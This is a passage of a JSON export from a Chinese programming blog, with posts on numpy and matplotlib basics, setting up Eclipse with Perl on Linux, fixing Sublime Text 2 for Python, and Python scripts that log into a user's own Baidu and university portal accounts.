学习笔记","slug":"learning-notes-for-python-numpy","date":"2015-03-28T03:51:08.000Z","updated":"2020-10-19T14:35:48.755Z","comments":true,"path":"learning-notes-for-python-numpy/","link":"","permalink":"https://www.hrwhisper.me/learning-notes-for-python-numpy/","excerpt":"python numpy的学习笔记","text":"python numpy的学习笔记 要使用numpy，首先需要import进来： 建议使用别名np，因为你会发现这几乎是一个大家都在用的写法！ 1import numpy as np 一、创建数组 1.和list类似，可以直接用arange来表示范围： 123import numpy as npa &#x3D; np.arange(10)print a Output: 1[0 1 2 3 4 5 6 7 8 9] 从[2,20)间隔为3的等差数列 123import numpy as npa &#x3D; np.arange(2,20,3)print a Output: 12[ 2 5 8 11 14 17] 类似arange，linspace从[start , stop ] 生成num个数，Num个数间隔相等。（默认为float） linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None) 1print np.linspace(0, 2, 9) Output: 1[ 0. 0.25 0.5 0.75 1. 1.25 1.5 1.75 2. ] 2.用list/tuple创建数组(list也可以是二维的) 123import numpy as npa &#x3D; np.array([range(5)])print a 3.快速生成x*y的全零数组 12d&#x3D;(2,3) #(2,3,4)变为3维print np.zeros(d) Output: 12[[ 0. 0. 0.] [ 0. 0. 0.]] 默认生成的类型是浮点型 可以用dtype改为int 12d &#x3D; (4, 5)print np.ones(d, dtype&#x3D;int) 还可以通过zeros_like生成相同形状的全0数组，如： 1img &#x3D; np.zeros_like(image) 0~1的随机数： 1np.random.rand(5) 3.一维转化为二维数组 reshape 123a&#x3D; np.arange(10)a &#x3D; a.reshape(2, 5)print a Output: 12[[0 1 2 3 4] [5 6 7 8 9]] PS: 这个会根据列来自动适应行！ 下面这句在a=np.arange(10)等价于a = a.reshape(2, 5) 在a=np.arange(20)等价于a = a.reshape(4, 5)！ 1a.reshape(-1, 5) 甚至可以转化为更高维的： 1234import numpy as npa &#x3D; np.arange(20)a &#x3D; a.reshape(2,2,5)print a Output: 1234567[[[ 0 1 2 3 4] [ 5 6 7 8 9]] [[10 11 12 13 14] [15 16 17 18 19]]] 当然，也可以二维转化一维的：ravel 123import numpy as npa &#x3D; np.array([[1,2,3],[4,5,6]])print np.ravel(a) Output: 1[1 2 3 4 5 6] 4. 切割vsplit和hsplit vsplit和hsplit用法差不多，差别在于：vsplit来进行分行，而hsplit来分列（即作用于同一行中）。 numpy.vsplit(ary, indices_or_sections) （1）指定切分个数（需要行数能被切分的个数整除） 看下面的代码，生成了6*3的数组，用vsplit切分为3个。 1234import numpy as npa &#x3D; np.arange(18).reshape(-1,3)print a,&#39;\\n&#39;print np.vsplit(a,3) Output: 12345678910111213[[ 0 1 2] [ 3 4 5] [ 6 7 8] [ 9 10 11] [12 13 14] [15 16 17]] [array([[0, 1, 2], [3, 4, 5]]), array([[ 6, 7, 8], [ 9, 10, 11]]), array([[12, 13, 14], [15, 16, 17]])] （2）指定位置切分 我只改动了最后一行，将vsplit第二个参数改为一个List，来指定切分的位置。 1234import numpy as npa &#x3D; np.arange(18).reshape(-1,3)print a,&#39;\\n&#39;print np.vsplit(a,[1,5]) Output: 12345678910111213[[ 0 1 2] [ 3 4 5] [ 6 7 8] [ 9 10 11] [12 13 14] [15 16 17]] [array([[0, 1, 2]]), array([[ 3, 4, 5], [ 6, 7, 8], [ 9, 10, 11], [12, 13, 14]]), array([[15, 16, 17]])] 5.查看数组属性 ndim :维度 shape:各维度的大小 size:全部的元素个数 dtype:查看元素类型 type:数组的类型 12345678import numpy as npa &#x3D; np.arange(20)a &#x3D; a.reshape(2,2,5)print a.ndim #a的维度print a.shape #a的各维度的大小print a.size #a的全部的元素个数print a.dtype #a的元素类型print type(a) #a的类型 Output: 123453(2L, 2L, 5L)20int32&lt;type &#39;numpy.ndarray&#39;&gt; 二、数组操作 1.四则运算 +'，'-'，'*'，'/'运算都是基于全部的数组元素的 1234import numpy as npa &#x3D; np.array([1,2])b&#x3D; np.array([3,4])print a+b Output: 1[4 6] 2.开根号/指数 1234567import numpy as npa &#x3D; np.array([1,2])print np.sqrt(a) print np.exp(a) print np.square(a)print np.power(a,5)print a ** 5 #可以用Power也可以直接 ** ,当然这么写比较爽 Output: 123456[ 1. 1.41421356][ 2.71828183 7.3890561 ][1 4][ 1 32][ 1 32] 3.数组最大最小值 12345678import numpy as npa &#x3D; np.arange(20).reshape(4,5)print aprint a.min()print a.max()print a.sum()print a.min(axis&#x3D;0) #minimun element in each columnprint a.min(axis&#x3D;1) #minimun element in each row Output: 12345678910[[ 0 1 2 3 4] [ 5 6 7 8 9] [10 11 12 13 14] [15 16 17 18 19]]019190[0 1 2 3 4][ 0 5 10 15] numpy.ptp(a, axis=None, out=None) 返回最大和最小值之差 4.数组的均值/中位数 1234import numpya &#x3D;range(5) +[1000]print aprint numpy.mean(a),numpy.median(a) Output: 12[0, 1, 2, 3, 4, 1000]168.333333333 2.5 5.数组取值 可以直接用下标对齐取值，注意直接赋值的话是浅拷贝！（即a赋给b，意味着b指向了a对应数据的内存地址） 想要真正的复制一份a给b，可以使用copy： 12345678# -*- coding:utf-8 -*-import numpy as npa &#x3D; np.array([[1, 2], [3, 4]])b &#x3D; a #浅拷贝！c &#x3D; a.copy() #深拷贝 np.copy(a)print a[1,1],a[1][1] b[1][1]&#x3D;5print a[1][1],b[1][1],c[1][1] Output: 124 45 5 4 利用':'可以访问到某一维的全部数据: 1234567# -*- coding:utf-8 -*-import numpy as npa &#x3D; np.arange(20).reshape(4, 5)print aprint &#39;\\n&#39;,a[:,[1,3]] #取出a的每一行的第2个和第4个元素print &#39;\\n&#39;,a[:,2][a[:,0] &gt; 5] #取出a中的第3列的元素，如果该行第1个元素 ＞５ Output: 1234567891011121314[[ 0 1 2 3 4] [ 5 6 7 8 9] [10 11 12 13 14] [15 16 17 18 19]][[ 1 3] [ 6 8] [11 13] [16 18]][12 17] 6.数组拼接 使用hstack 横向拼接 使用vstack 纵向拼接 12345678import numpy as npimport numpy.linalg as nlga &#x3D; np.array([1,2,3])b &#x3D; np.array([4,5,6])c &#x3D; np.hstack([a,b])d &#x3D; np.vstack([a,b])print cprint d Output: 123[1 2 3 4 5 6][[1 2 3] [4 5 6]] 三、矩阵对象 矩阵对象和数组的主要有两点差别： 矩阵是二维的，而数组的可以是任意正整数维 矩阵的''操作符进行的是矩阵乘法，乘号左侧的矩阵列和乘号右侧的矩阵行要相等，而在数组中''操作符进行的是每一元素的对应相乘，乘号两侧的数组每一维大小需要一致 1.创建矩阵 12345678910# -*- coding:utf-8 -*-import numpy as npa &#x3D; np.arange(5)a &#x3D; np.mat(a) #use np.mat(a) or np.asmatrix(a)print a,type(a)b &#x3D; np.mat(&#39;1.0 2.0; 3.0 4.0&#39;) # you can use np.matrix()print b,type(b) Output: 1234[[0 1 2 3 4]] &lt;class &#39;numpy.matrixlib.defmatrix.matrix&#39;&gt;[[ 1. 2.] [ 3. 4.]] &lt;class &#39;numpy.matrixlib.defmatrix.matrix&#39;&gt; 2.矩阵乘法 为了比较和数组的乘法，特地将b设为单位阵。 1234567891011# -*- coding:utf-8 -*-import numpy as npa &#x3D; np.array([[1, 2], [3, 4]])b &#x3D; np.array([[1, 0], [0, 1]])print &#39;a&#x3D;&#39;, a, &#39;\\nb&#x3D;&#39;, bprintprint &#39;array : a*b:&#39;print a * bprint &#39;matrix: a*b:&#39;print np.asmatrix(a) * np.asmatrix(b) Output: 1234567891011121314a&#x3D; [[1 2] [3 4]] b&#x3D; [[1 0] [0 1]]array : a*b:[[1 0] [0 4]]matrix: a*b:[[1 2] [3 4]] 3.矩阵转置 12345# -*- coding:utf-8 -*-import numpy as npa &#x3D; np.array([[1, 2, 3], [4, 5, 6]])print np.transpose(a) #对于数组，用transposeprint np.matrix(a).T #对于矩阵，直接T Output: 123456[[1 4] [2 5] [3 6]][[1 4] [2 5] [3 6]] 4.矩阵求逆 123456import numpy as npimport numpy.linalg as nlga &#x3D; np.mat([[1,2],[4,4]]) print ab &#x3D; nlg.inv(a)print a*b Output: 1234[[1 2] [4 4]][[ 1. 0.] [ 0. 1.]] 5.特征值和特征向量 12345678import numpy as npimport numpy.linalg as nlga &#x3D; np.random.rand(3,3)eig_value, eig_vector &#x3D; nlg.eig(a)print &quot;eigen value:&quot;print eig_valueprint &quot;eigen vector:&quot;print eig_vector Output: 1234567eigen value:[ 1.35205837 -0.22652725 0.12474347]eigen vector:[[-0.66475046 -0.42263921 0.031526 ] [-0.54161542 0.70097608 -0.45506146] [-0.51454792 -0.57446378 0.88990178]] 四、其它 1.缺失值处理 NumPy用nan作为缺失值，可以用isnan判定： 1234import numpy as npa &#x3D; np.random.rand(2,2)a[0, 1] &#x3D; np.nanprint np.isnan(a) nan_to_num()可用来将nan替换成0 2.统计函数 np.bincount(a)：对整数数组中各个元素出现的次数进行统计，它要求数组中所有元素都是非负的，返回值中，第i个元素表示第i个元素在a中出现的次数。 3.比较函数 直接用==比较 对于相同长度的，返回一个numpy数组，每个元素为相应位置上是否相等. 长度不相同，返回False 12345import numpy as npa &#x3D; np.arange(5)b &#x3D; np.array([0,1,2,4,3])print a&#x3D;&#x3D;bprint a&#x3D;&#x3D;np.array([0,1,2,4,3,5]) Output: 12[ True True True False False]False 参考资料： 量化分析师的Python日记【第3天：一大波金融Library来袭之numpy篇】 python 科学计算 -张若愚","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"python库","slug":"python库","permalink":"https://www.hrwhisper.me/tags/python%E5%BA%93/"}]},{"title":"Linux 下安装eclipse 及 perl 插件","slug":"linux-eclipse-perl-environment","date":"2015-03-25T13:24:03.000Z","updated":"2021-01-08T13:42:14.064Z","comments":true,"path":"linux-eclipse-perl-environment/","link":"","permalink":"https://www.hrwhisper.me/linux-eclipse-perl-environment/","excerpt":"虽然eclipse挺丑，但是还是挺好用的。","text":"虽然eclipse挺丑，但是还是挺好用的。 一、安装java环境 由于eclipse需要java环境，所以首先在终端中输入java，看看是否已经安装。 如果未安装，输入apt-get insall default-jre 就会自行下载java，并配置好环境。 装好后可以输入java -version 看看版本号 java安装完后 二、下载解压eclipse 去eclipse官网下载eclipse,记得选Linux版本： 下载完后下载到你想安装的目录，用tar -xzvf命令解压，如图： 解压 tar -xzvf 解压完成后，会在当前目录下多一个eclipse文件夹，输入./eclipse即可运行。 运行 三、安装perl插件 (一)安装EPCI插件 打开eclipse，点击工具栏，help-&gt; install new software 在弹出的窗口点击add如图，输入如图内容（Name可以随便写） 安装perl插件 按ok之后选择EPIC main components 接下来一路next即可。 接下来一路Next （二）安装PadWalker 刚才的EPIC只是让我们的eclipse支持perl，但是你可以尝试按下F11进行debugger，会发现提示不能显示变量值。此时需要安装PadWalker 终端中输入cpan，提示是否打开下载模式，输入y，之后输入install PadWalker 即可 如下图: cpan 安装完这两个插件，就可以愉快的进行perl之旅啦~ 安装完PadWalker","categories":[{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"解决sublime text2编辑python的一些问题","slug":"sublime-text2-python-matplotlib-not-work-solution","date":"2015-03-22T07:04:45.000Z","updated":"2021-01-08T13:42:14.033Z","comments":true,"path":"sublime-text2-python-matplotlib-not-work-solution/","link":"","permalink":"https://www.hrwhisper.me/sublime-text2-python-matplotlib-not-work-solution/","excerpt":"使用sublime text2 来写python 主要有如下两个Bug: 使用 matplotlib 库的时候，用sublime text2 运行之发现无效！ 有输入的时候，提示 EOFError: EOF when reading a line","text":"使用sublime text2 来写python 主要有如下两个Bug: 使用 matplotlib 库的时候，用sublime text2 运行之发现无效！ 有输入的时候，提示 EOFError: EOF when reading a line 一、sublime text2 运行matplotlib 库无效 PS:推荐直接看方法 解决EOF的方法！那个解决了也可以解决这个！ 如果你要继续ctrl+b运行的话，那么具体解决方法如下： 英文：Preferences=&gt;Browse Packages=&gt;Default=&gt;exec.py 中文：首选项=&gt;浏览插件=&gt;Default=&gt;exec.py 将33行的startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW 注释掉 12345# Hide the console window on Windowsstartupinfo &#x3D; Noneif os.name &#x3D;&#x3D; &quot;nt&quot;: startupinfo &#x3D; subprocess.STARTUPINFO() startupinfo.dwFlags &#x3D; subprocess.STARTF_USESHOWWINDOW 如下： 12345# Hide the console window on Windowsstartupinfo &#x3D; Noneif os.name &#x3D;&#x3D; &quot;nt&quot;: startupinfo &#x3D; subprocess.STARTUPINFO() #startupinfo.dwFlags &#x3D; subprocess.STARTF_USESHOWWINDOW 二、raw_input 提示 EOFError 按下ctrl +shift + p 快捷键 ，在弹出的控制台输入install package，如图 install package 在弹出的窗口输入SublimeRepl，等起安装完后，重启下sublime text2 SublimeRepl 接下来，在按键绑定—用户中加入如下内容，其中F5是启动的快捷键。 12345678910 &#123; &quot;keys&quot;:[&quot;f5&quot;], &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;, &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;: &#123;&quot;id&quot;: &quot;repl_python_run&quot;,&quot;file&quot;: &quot;config&#x2F;Python&#x2F;Main.sublime-menu&quot; &#125;&#125; 保存后按下F5，就OK啦~ 附无干扰模式下显示行号 首选项-设置更多-无干扰模式输入一下内容（需要行号和边列都是true） 12345678&#123; &quot;line_numbers&quot;: true, &#x2F;&#x2F;是否显示行号 &quot;gutter&quot;: true, &#x2F;&#x2F;是否显示边列 &quot;draw_centered&quot;: true, &#x2F;&#x2F;是否居中显示 &quot;wrap_width&quot;: 80, &#x2F;&#x2F;换行宽度(单位：字符) &quot;word_wrap&quot;: true, &#x2F;&#x2F;是否自动换行 &quot;scroll_past_end&quot;: true &#x2F;&#x2F;滚动能否超过结尾&#125;","categories":[{"name":"开发环境/开发工具","slug":"开发环境-开发工具","permalink":"https://www.hrwhisper.me/categories/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"python matplotlib 库学习笔记","slug":"learning-notes-for-python-matplotlib","date":"2015-03-22T04:55:52.000Z","updated":"2020-10-22T14:59:14.406Z","comments":true,"path":"learning-notes-for-python-matplotlib/","link":"","permalink":"https://www.hrwhisper.me/learning-notes-for-python-matplotlib/","excerpt":"python 大法好，学习python 受益终身。 最近图像处理要用到 python matplotlib 库，有用到的话，都在这里记录。","text":"python 大法好，学习python 受益终身。 最近图像处理要用到 python matplotlib 库，有用到的话，都在这里记录。 官方样例地址： http://matplotlib.org/gallery.html python matplotlib 绘图基本步骤 先看看如下代码： 12345678910111213141516171819import numpy as npimport matplotlib.pyplot as pltx = np.linspace(0, 10, 1000)y = np.sin(x)z = np.cos(x**2)plt.figure(figsize=(8,4))plt.plot(x,y,label=&quot;$sin(x)$&quot;,color=&quot;red&quot;,linewidth=2)plt.plot(x,z,&quot;b--&quot;,label=&quot;$cos(x^2)$&quot;)plt.xlabel(&quot;Time(s)&quot;)plt.ylabel(&quot;Volt&quot;)plt.title(&quot;PyPlot First Example&quot;)plt.ylim(-1.2,1.2)plt.legend()plt.show() 1.载入matplotlib的绘图模块pyplot，并重命名为plt 1import matplotlib.pyplot as plt 2. 调用figure()创建一个Figure(图表)对象 还可以设置DPI（即每英寸所表示的像素数），缺省值为80。因此本例中所创建的Figure对象的宽度为“8*80 = 640”个像素。 3.调用plot()在当前的Figure对象中绘图 参数说明： X：X轴数据 Y：Y轴数据 指定曲线的颜色和线性，如'b-'表示，蓝色虚线（b:蓝色,-虚线） 使用关键字参数可以指定所绘制的曲线的各种属性： label：给曲线指定一个标签名称，此标签将在图示中显示。如果标签字符串的前后有字符’$’，则matplotlib会使用其内嵌的LaTex引擎将其显示为数学公式。 color：指定曲线的颜色。颜色可以用如下方法表示 英文单词 以’#’字符开头的三个16进制数，如’#ff0000’表示红色。 0~1的RGB表示，如(1.0, 0.0, 0.0)也表示红色。 linewidth：指定曲线的宽度，可以不是整数，也可以使用缩写形式的参数名lw。 当然，它也可以同时画两个曲线，如下图，同时画出正弦和余弦曲线： 12x=np.arange(0,5,0.1)plt.plot(x, np.sin(x), x, np.cos(x)) 4.通过一系列函数设置当前Axes对象的各个属性： xlabel、ylabel：分别设置X、Y轴的标题文字。 title：设置子图的标题。 xlim、ylim：分别设置X、Y轴的显示范围。 legend：显示图示，即图中表示每条曲线的标签(label)和样式的矩形区域。 5.调用plt.show()显示出绘图窗口 在通常的运行情况下，show()将会阻塞程序的运行，直到用户关闭绘图窗口。 保存图像 1plt.savefig(&quot;test.png&quot;, dpi&#x3D;120) 采用面向对象方法进行绘图 pyplot模块虽然用法简单，但不适合在较大的应用程序中使用。 当前的图表和子图可以使用gcf()和gca()获得 123fig = plt.gcf()axes = plt.gca()print fig,axes output: 1Figure(640x480) Axes(0.125,0.1;0.775x0.8) plot()实际上会通过gca()获得当前的Axes对象ax，然后再调用它的plot()方法实现真正的绘图。 12345678def plot(*args, **kwargs):ax = gca()...try: ret = ax.plot(*args, **kwargs) ...finally: ax.hold(washold) 配置属性 plot()返回一个元素类型为Line2D的列表 下面的代码中，对x^3的数组取消了抗锯齿效果。 1234x = np.arange(0, 5, 0.1)line = plt.plot(x, x*x,x,x**3)[1] line.set_antialiased(False) plt.show() 调用setp()可以同时配置多个对象的属性，这里我们同时设置两条曲线的颜色和线宽： 1234x = np.arange(0, 5, 0.1)line = plt.plot(x, x*x,x,x**3)plt.setp(line, color=&quot;r&quot;, linewidth=2.0)plt.show() 绘制多子图 一个Figure对象可以包含多个子图(Axes) 我们可以使用subplot()快速绘制包含多个子图的图表，它的调用形式如下： 1subplot(numRows, numCols, plotNum)#行，列，区域号 图表的整个绘图区域被等分为numRows行和numCols列，然后按照从左到右、从上到下的顺序对每个区域进行编号，左上区域的编号为1。 如果新创建的子图和之前创建的子图区域有重叠的部分，则之前的子图将被删除。 numRows、numCols和plotNum三个参数都小于10，则可以把它们缩写成一个整数，例如subplot(323)和subplot(3,2,3)的含义相同 subplot()返回它所创建的Axes对象 123for idx, color in enumerate(&quot;rgbyck&quot;):plt.subplot(321+idx, axisbg=color)plt.show() 如果希望某个子图占据整行或者整列，可以如下调用subplot()： 1234plt.subplot(221) # 第一行的左图plt.subplot(222) # 第一行的右图plt.subplot(212) # 第二整行plt.show() 用sca()交替不同图/子图它们成为当前Axes对象，并调用plot()在其中绘图 123456789101112131415161718import numpy as npimport matplotlib.pyplot as pltplt.figure(1) # 创建图表1plt.figure(2) # 创建图表2ax1 = plt.subplot(211) # 在图表2中创建子图1ax2 = plt.subplot(212) # 在图表2中创建子图2x = np.linspace(0, 3, 100)for i in xrange(5): plt.figure(1) # 选择图表1 plt.plot(x, np.exp(i*x/3)) plt.sca(ax1) # 选择图表2的子图1 plt.plot(x, np.sin(i*x)) plt.sca(ax2) # 选择图表2的子图2 plt.plot(x, np.cos(i*x))plt.show() 在图表中显示中文 matplotlib的缺省配置文件中所使用的字体无法正确显示中文。为了让图表能正确显示中文，可以有几种解决方案。 在程序中直接指定字体。 在程序开头修改配置字典rcParams。 修改配置文件。 下面是通过修改字体实现的。其实我也比较喜欢这个 1234567891011from matplotlib.font_manager import FontPropertiesimport matplotlib.pyplot as pltimport numpy as npfont &#x3D; FontProperties(fname&#x3D;r&quot;c:\\windows\\fonts\\simsun.ttc&quot;, size&#x3D;14) t &#x3D; np.linspace(0, 10, 1000)y &#x3D; np.sin(t)plt.plot(t, y)plt.xlabel(u&quot;时间&quot;, fontproperties&#x3D;font) plt.ylabel(u&quot;振幅&quot;, fontproperties&#x3D;font)plt.title(u&quot;正弦波&quot;, fontproperties&#x3D;font)plt.show() 其他 在图表中输出图像：plt.imshow(img) 柱状图 原地址http://matplotlib.org/examples/statistics/histogram_demo_features.html 1234567891011121314151617# -*- coding:utf-8 -*-import numpy as npimport matplotlib.mlab as mlabimport matplotlib.pyplot as pltx = [5,6,7,8,5,6,5] #数据num_bins = 5 #列数 # the histogram of the databins= plt.hist(x, num_bins, normed=1, facecolor=&#x27;green&#x27;, alpha=0.5)plt.xlabel(&#x27;Smarts&#x27;) plt.ylabel(&#x27;Probability&#x27;)plt.title(r&#x27;Histogram&#x27;)# Tweak spacing to prevent clipping of ylabelplt.subplots_adjust(left=0.15)plt.show()","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"matplotlib","slug":"matplotlib","permalink":"https://www.hrwhisper.me/tags/matplotlib/"},{"name":"python库","slug":"python库","permalink":"https://www.hrwhisper.me/tags/python%E5%BA%93/"},{"name":"图像处理","slug":"图像处理","permalink":"https://www.hrwhisper.me/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}]},{"title":"python 爬虫之模拟登陆实战（二）百度","slug":"python-web-crawler-login-baidu","date":"2015-03-18T08:04:36.000Z","updated":"2021-01-08T13:42:14.030Z","comments":true,"path":"python-web-crawler-login-baidu/","link":"","permalink":"https://www.hrwhisper.me/python-web-crawler-login-baidu/","excerpt":"好了，上一次的登陆微人大让我们有了很好的经验，虽然那系统比较水。 这一次选择百度来~","text":"好了，上一次的登陆微人大让我们有了很好的经验，虽然那系统比较水。 这一次选择百度来~ 战前准备 打开百度登陆页面https://passport.baidu.com/v2/?login 首先进行一次正常的登陆，看看postData都有什么。（下面这张图是我用火狐浏览器插件httpfox得到的，用fiddler2也可以） postData 发现又有个token值，首先我们要知道这个值是怎么被设置的。 经过fiddler2发现，登录前，会访问一个网址(在下面的程序中有，url_token),在response中返回一个json格式的，包含有token的值。 百度登陆token 需要注意的是，百度需要进行伪装头部，至于头部怎么伪装，用fiddler抓下你正常登陆时候的头部，一一模仿即可。 最终代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# -*- coding: utf8 -*-# author: hrwhisper# blog : hrwhisper.me# date : 2015.5.3import requestsimport urllibimport urllib2import reimport cookielibclass baiduLogin: url_token = &#x27;https://passport.baidu.com/v2/api/?getapi&amp;tpl=pp&amp;apiver=v3&amp;tt=1426660772709&amp;class=login&amp;logintype=basicLogin&amp;callback=bd__cbs__hif73f&#x27; url_login = &#x27;https://passport.baidu.com/v2/api/?login&#x27; url_tieba = &#x27;http://tieba.baidu.com/f/like/mylike?v=1387441831248&#x27; s = requests.Session() def startLogin(self,username,password): #urllib2.install_opener(self.opener) postData = &#123; &#x27;username&#x27; : username, &#x27;password&#x27; : password, &#x27;token&#x27; : self.getToken(), &#x27;charset&#x27; : &#x27;UTF-8&#x27;, &#x27;apiver&#x27; : &#x27;v3&#x27;, &#x27;isPhone&#x27; : &#x27;false&#x27;, &#x27;tpl&#x27; : &#x27;pp&#x27;, &#x27;u&#x27; : &#x27;https://passport.baidu.com/&#x27;, &#x27;staticpage&#x27; : &#x27;https://passport.baidu.com/static/passpc-account/html/v3Jump.html&#x27;, &#x27;callback&#x27; : &#x27;parent.bd__pcbs__ra48vi&#x27; &#125; myhead=&#123; &#x27;Host&#x27;: &#x27;passport.baidu.com&#x27;, &#x27;Referer&#x27;: &#x27;https://passport.baidu.com/v2/?login&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;, &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en;q=0.6&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36&#x27; , &#125; self.s.post(self.url_login,data=postData,headers=myhead) def getToken(self): r = self.s.get(u&#x27;http://www.baidu.com/&#x27;) r = self.s.get(self.url_token) #取个别名并且从分组中取出token token = re.search(u&#x27;&quot;token&quot; : &quot;(?P&lt;token&gt;.*?)&quot;&#x27;,r.text) return token.group(&#x27;token&#x27;) def getMyTieBa(self): tieba = self.s.get(self.url_tieba) tieba.encoding = &#x27;gbk&#x27; print tieba.text username = &#x27;&#x27;password = &#x27;&#x27;baidu = baiduLogin()baidu.startLogin(username, password)baidu.getMyTieBa() Python爬虫系列教程 python 爬虫 入门 python模拟登陆 python 爬虫之模拟登陆实战（一）微人大 python 爬虫之模拟登陆实战（二）百度","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://www.hrwhisper.me/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"python 爬虫之模拟登陆实战（一）微人大","slug":"python-web-crawler-login-vruc","date":"2015-03-17T03:03:05.000Z","updated":"2020-10-22T14:59:43.406Z","comments":true,"path":"python-web-crawler-login-vruc/","link":"","permalink":"https://www.hrwhisper.me/python-web-crawler-login-vruc/","excerpt":"python爬虫实战篇，模拟登陆微人大，才能查看成绩什么的。","text":"python爬虫实战篇，模拟登陆微人大，才能查看成绩什么的。 2015.5.3更新： 更新使用requests的代码 战前准备 打开fiddler2，然后用chrome打开微人大首页，v.ruc.edu.cn 尝试进行正确的登陆，发现发送包如下： 登陆发送的数据 发现它用post方法发送至https://uc.tiup.cn/account/login,且发送了如下五个字段， csrf_token : 这是一个随机值 school_code : 学校代码 username : 用户名 password : 密码 remember_me : 是否记住登陆状态（显然就是登陆旁边的那个保持登录状态） 那么，我们首先要获取的是csrf_token 这个玩意，我们往前看，发现刚进页面还没登录时，response有如下字段： set-cookie，设置了一个名为csrf_token 的cookie，并且该cookie是仅在建立连接的时候发送（httponly） csrf_token是如何建立的 那么我们可以想象登陆过程如下： 打开登陆页面被设置了一个名为csrf_token 的cookie 输入用户名密码登陆，发送五个字段，包括csrf_token 验证通过后进行重定向 最终code 只是登陆的演练，所以没有从里面抠出成绩。只是打印出成绩的整个页面的HTML 而且服务器太弱，竟然连头部验证什么的都没有。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# -*- coding: utf-8 -*-# author: hrwhisper# blog : hrwhisper,me# date : 2015.5.3import requestsimport reclass vRuc: url_token = &#x27;https://uc.tiup.cn/account/login?client_id=uc.tiup.cn&amp;redirect_uri=%2Foauth%2Fauthorize%3Fclient_id%3Duc.tiup.cn%26redirect_uri%3Dhttp%253A%252F%252Fv.ruc.edu.cn%252Fsso%252Flogin%253Fredirect_uri%253D%25252FUser%2526school_code%253Druc%2526theme%253Dschools%26response_type%3Dcode%26school_code%3Druc%26scope%3Dall%26sso%3Dtrue%26state%3DZ08-C1r99RVtBwYVkEm12XxfhvVlW680YDKwfAaPU1DG-_mx%26theme%3Dschools&amp;response_type=code&amp;school_code=ruc&amp;scope=all&amp;sso=true&amp;state=Z08-C1r99RVtBwYVkEm12XxfhvVlW680YDKwfAaPU1DG-_mx&amp;theme=schools&#x27; url_login = &#x27;https://uc.tiup.cn/account/login&#x27; url_redirect =&#x27;https://uc.tiup.cn/oauth/authorize?client_id=uc.tiup.cn&amp;amp;redirect_uri=http%3A%2F%2Fv.ruc.edu.cn%2Fsso%2Flogin%3Fredirect_uri%3D%252FUser%26school_code%3Druc%26theme%3Dschools&amp;amp;response_type=code&amp;amp;school_code=ruc&amp;amp;scope=all&amp;amp;sso=true&amp;amp;state=vhfL6zHS_J4cH88Z_A-ZHl7RIUxmPrZEnffvYdtsCf7tWpz7&amp;amp;theme=schools&#x27; url_score = &#x27;http://app.ruc.edu.cn/idc/education/report/xscjreport/XscjReportAction.do?method=printXscjReport&amp;xh=&#x27; url_myCourse=&#x27;http://app.ruc.edu.cn/idc/education/selectcourses/studentselectcourse/StudentSelectCourseAction.do&#x27; s = requests.Session() myheader=&#123; &#x27;Referer&#x27;: &#x27;http://app.ruc.edu.cn/idc/education/report/xscjreport/XscjReportAction.do?method=queryXscjReport&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36&#x27;,&#x27;Accept-Encoding&#x27;:&#x27;gzip, deflate, sdch&#x27;,&#x27;Accept-Language&#x27;:&#x27;zh-CN,zh;q=0.8,en;q=0.6&#x27;,&#125; def startLogin(self,username,password): self.login(self.getToken(),username,password) self.redirect() def getScore(self): r = self.s.get(self.url_score,headers=self.myheader) r.encoding=&#x27;gbk&#x27; print r.text def redirect(self): self.s.get(self.url_redirect) def login(self,csrf_token,username,password): postData = &#123; &#x27;csrf_token&#x27; : csrf_token, &#x27;school_code&#x27; : &#x27;ruc&#x27;, &#x27;username&#x27;: username, &#x27;password&#x27;: password, &#x27;remember_me&#x27; : &#x27;true&#x27; &#125; self.s.post(self.url_login,data=postData) def getToken(self): r = self.s.get(self.url_token) csrf_token=r.cookies[&#x27;csrf_token&#x27;] return csrf_token def getMyCourse(self): postData = &#123; &#x27;method&#x27;: &#x27;queryXkjg&#x27;, &#x27;isNeedInitSQL&#x27;: &#x27;true&#x27;, &#x27;xnd&#x27; :&#x27;2014-2015&#x27;, &#x27;xq&#x27;: &#x27;2&#x27;, 